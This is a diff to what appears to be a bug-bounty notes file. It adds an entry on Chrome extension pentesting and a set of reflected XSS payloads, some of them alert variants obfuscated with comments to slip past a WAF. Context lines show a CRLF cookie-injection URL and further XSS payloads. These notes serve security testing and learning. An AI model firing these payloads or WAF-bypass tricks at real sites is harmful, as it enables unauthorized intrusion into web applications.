@@ -113,4 +113,18 @@ https://www.abc.com/%0D%0ASet-Cookie:crlfinjection=crlfinjection
 /><svg src=x onload=confirm("1337");>
 "><div onmouseover="alert('XSS');">Hello :)
 ```
+# 📅 15-Apr-2021
+## Chrome Extension Pentesting
+- https://twitter.com/harshbothra_/status/1382049428165390338?s=20
+
+## Reflected XSS Payload
+
+### Payload
+```js
+"><img src=x onerror=alert(1)> on every input field
+'-alert(1)-' (WAF 405)
+'-alert/**/(1)-' (WAF 405)
+'-alert/*any*/(1)-' (Success)
+```
+![img](https://pbs.twimg.com/media/EyswkGtU4Ac3K3J?format=jpg&name=small)
 
